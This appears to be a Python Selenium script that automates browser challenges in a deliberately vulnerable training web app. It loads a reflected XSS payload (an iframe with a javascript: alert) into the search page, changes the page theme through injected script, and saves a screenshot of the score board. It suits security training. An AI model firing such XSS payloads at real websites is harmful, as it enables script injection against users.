from time import sleep

from selenium import webdriver


def get_browser():
    return webdriver.Chrome()


def open_xss1_alert(server, browser):
    print('Popping reflected XSS1 in browser...'),
    xssurl = '{}/#/search?q=%3Ciframe%20src%3D%22javascript%3Aalert(%60xss%60)%22%3E'.format(server)
    browser.get(xssurl)
    # Sleep just to show the XSS alert
    sleep(3)
    browser.switch_to.alert.accept()
    print('Success.')


def travel_back_in_time(server, browser):
    print('Travelling back to the glorious days of Geocities...'),
    browser.get('{}/#/score-board'.format(server))
    browser.execute_script("$('#theme').attr('href', '/css/geo-bootstrap/swatch/bootstrap.css')")
    # Savour the best of themes.
    sleep(3)
    browser.refresh()
    print('Success.')


def take_screenshot_of_score_and_quit(server, browser):
    print('Taking screenshot...'),
    browser.get('{}/#/score-board'.format(server))
    with open('complete.png', 'wb') as outfile:
        outfile.write(browser.get_screenshot_as_png())
    print('complete.png saved successfully.')
    browser.quit()


def solve_browser_challenges(server):
    print('\n== BROWSER CHALLENGES ==\n')
    try:
        browser = get_browser()
    except Exception as err:
        print('Unknown Selenium exception. Have you added the Chromedriver to your PATH?\n{}'.format(repr(err)))
        return
    open_xss1_alert(server, browser)
    #travel_back_in_time(server, browser) # TODO
    take_screenshot_of_score_and_quit(server, browser)
    print('\n== BROWSER CHALLENGES COMPLETE ==\n')

if __name__ == '__main__':
    #server = 'http://localhost:3000'
    solve_browser_challenges(server)
